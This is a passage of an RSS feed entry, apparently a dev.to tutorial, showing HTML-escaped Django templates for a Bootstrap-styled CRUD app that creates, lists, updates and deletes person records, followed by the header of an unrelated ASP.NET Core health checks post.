              &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nav-link active"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"home-tab"&lt;/span&gt; &lt;span class="na"&gt;data-bs-toggle=&lt;/span&gt;&lt;span class="s"&gt;"tab"&lt;/span&gt; &lt;span class="na"&gt;data-bs-target=&lt;/span&gt;&lt;span class="s"&gt;"#home"&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"button"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"tab"&lt;/span&gt; &lt;span class="na"&gt;aria-controls=&lt;/span&gt;&lt;span class="s"&gt;"home"&lt;/span&gt; &lt;span class="na"&gt;aria-selected=&lt;/span&gt;&lt;span class="s"&gt;"true"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Create&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;li&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nav-item"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"presentation"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"nav-link"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"profile-tab"&lt;/span&gt; &lt;span class="na"&gt;data-bs-toggle=&lt;/span&gt;&lt;span class="s"&gt;"tab"&lt;/span&gt; &lt;span class="na"&gt;data-bs-target=&lt;/span&gt;&lt;span class="s"&gt;"#profile"&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"button"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"tab"&lt;/span&gt; &lt;span class="na"&gt;aria-controls=&lt;/span&gt;&lt;span class="s"&gt;"profile"&lt;/span&gt; &lt;span class="na"&gt;aria-selected=&lt;/span&gt;&lt;span class="s"&gt;"false"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Retreive&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/li&amp;gt;&lt;/span&gt;

          &lt;span class="nt"&gt;&amp;lt;/ul&amp;gt;&lt;/span&gt;
          &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"tab-content"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"myTabContent"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"tab-pane fade show active"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"home"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"tabpanel"&lt;/span&gt; &lt;span class="na"&gt;aria-labelledby=&lt;/span&gt;&lt;span class="s"&gt;"home-tab"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;"{% url 'add_person' %}"&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;"post"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                {% csrf_token %}
                &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput1"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;First Name&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"fname"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput1"&lt;/span&gt; &lt;span class="na"&gt;placeholder=&lt;/span&gt;&lt;span class="s"&gt;"Madhuban"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput2"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Last Name&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"lname"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput2"&lt;/span&gt; &lt;span class="na"&gt;placeholder=&lt;/span&gt;&lt;span class="s"&gt;"Khatri"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput3"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Age&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"number"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"age"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput3"&lt;/span&gt; &lt;span class="na"&gt;placeholder=&lt;/span&gt;&lt;span class="s"&gt;"21"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput4"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Are you Single?&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;select&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"bool"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput4"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;Yes&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;No&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;/select&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"submit"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control btn btn-warning"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Add"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"tab-pane fade"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"profile"&lt;/span&gt; &lt;span class="na"&gt;role=&lt;/span&gt;&lt;span class="s"&gt;"tabpanel"&lt;/span&gt; &lt;span class="na"&gt;aria-labelledby=&lt;/span&gt;&lt;span class="s"&gt;"profile-tab"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                &lt;span class="nt"&gt;&amp;lt;table&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"table"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;thead&amp;gt;&lt;/span&gt;
                      &lt;span class="nt"&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"col"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;#&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"col"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;First Name&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"col"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Last Name&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"col"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Is Married&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                        &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"col"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Action&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                      &lt;span class="nt"&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;/thead&amp;gt;&lt;/span&gt;
                    &lt;span class="nt"&gt;&amp;lt;tbody&amp;gt;&lt;/span&gt;
                        {% for data in datas %}
                            &lt;span class="nt"&gt;&amp;lt;tr&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;th&lt;/span&gt; &lt;span class="na"&gt;scope=&lt;/span&gt;&lt;span class="s"&gt;"row"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;{{data.id}}&lt;span class="nt"&gt;&amp;lt;/th&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;td&amp;gt;&lt;/span&gt;{{data.first_name}}&lt;span class="nt"&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;td&amp;gt;&lt;/span&gt;{{data.last_name}}&lt;span class="nt"&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;td&amp;gt;&lt;/span&gt;{{data.is_married}}&lt;span class="nt"&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;td&amp;gt;&lt;/span&gt;
                                    &lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"{% url 'update_person' data.id %}"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"btn btn-sm btn-primary"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Update&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;    
                                    &lt;span class="nt"&gt;&amp;lt;a&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"{% url 'delete_person' data.id %}"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"btn btn-sm btn-danger"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Delete&lt;span class="nt"&gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
                                &lt;span class="nt"&gt;&amp;lt;/td&amp;gt;&lt;/span&gt;
                            &lt;span class="nt"&gt;&amp;lt;/tr&amp;gt;&lt;/span&gt;
                        {% endfor %}

                    &lt;span class="nt"&gt;&amp;lt;/tbody&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;/table&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;

          &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;


    &lt;span class="c"&gt;&amp;lt;!-- Option 1: Bootstrap Bundle with Popper --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"&lt;/span&gt; &lt;span class="na"&gt;integrity=&lt;/span&gt;&lt;span class="s"&gt;"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"&lt;/span&gt; &lt;span class="na"&gt;crossorigin=&lt;/span&gt;&lt;span class="s"&gt;"anonymous"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;


  &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#updatehtml"&gt;
  &lt;/a&gt;
  update.html
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="c"&gt;&amp;lt;!-- Required meta tags --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;"utf-8"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="c"&gt;&amp;lt;!-- Bootstrap CSS --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt; &lt;span class="na"&gt;integrity=&lt;/span&gt;&lt;span class="s"&gt;"sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"&lt;/span&gt; &lt;span class="na"&gt;crossorigin=&lt;/span&gt;&lt;span class="s"&gt;"anonymous"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;

    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Hello, world!&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"container"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;h2&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"my-5"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Update Person&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;form&lt;/span&gt; &lt;span class="na"&gt;action=&lt;/span&gt;&lt;span class="s"&gt;"{% url 'update' data.id %}"&lt;/span&gt; &lt;span class="na"&gt;method=&lt;/span&gt;&lt;span class="s"&gt;"post"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
          {% csrf_token %}
          &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput1"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;First Name&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"fname"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput1"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"{{data.first_name}}"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput2"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Last Name&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"text"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"lname"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput2"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"{{data.last_name}}"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput3"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Age&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"number"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"age"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput3"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"{{data.age}}"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;label&lt;/span&gt; &lt;span class="na"&gt;for=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput4"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-label"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;Are you Single?&lt;span class="nt"&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;select&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control"&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"bool"&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"exampleFormControlInput4"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
                  {% if data.is_married == 'Yes' %}
                  &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;Yes&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;No&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                  {% else %}
                  &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;No&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                  &lt;span class="nt"&gt;&amp;lt;option&amp;gt;&lt;/span&gt;Yes&lt;span class="nt"&gt;&amp;lt;/option&amp;gt;&lt;/span&gt;
                  {% endif%}
              &lt;span class="nt"&gt;&amp;lt;/select&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"mb-3"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
              &lt;span class="nt"&gt;&amp;lt;input&lt;/span&gt; &lt;span class="na"&gt;type=&lt;/span&gt;&lt;span class="s"&gt;"submit"&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"form-control btn btn-warning"&lt;/span&gt; &lt;span class="na"&gt;value=&lt;/span&gt;&lt;span class="s"&gt;"Update"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
          &lt;span class="nt"&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;



    &lt;span class="c"&gt;&amp;lt;!-- Option 1: Bootstrap Bundle with Popper --&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"&lt;/span&gt; &lt;span class="na"&gt;integrity=&lt;/span&gt;&lt;span class="s"&gt;"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"&lt;/span&gt; &lt;span class="na"&gt;crossorigin=&lt;/span&gt;&lt;span class="s"&gt;"anonymous"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;


  &lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>django</category>
      <category>python</category>
      <category>crud</category>
    </item>
    <item>
      <title>How to add Health Checks to ASP.NET Core project. A coding story.</title>
      <author>Oleksii Nikiforov</author>
      <pubDate>Sun, 25 Jul 2021 15:34:41 +0000</pubDate>
      <link>https://dev.to/nikiforovall/how-to-add-health-checks-to-asp-net-core-project-a-coding-story-94m</link>
      <guid>https://dev.to/nikiforovall/how-to-add-health-checks-to-asp-net-core-project-a-coding-story-94m</guid>
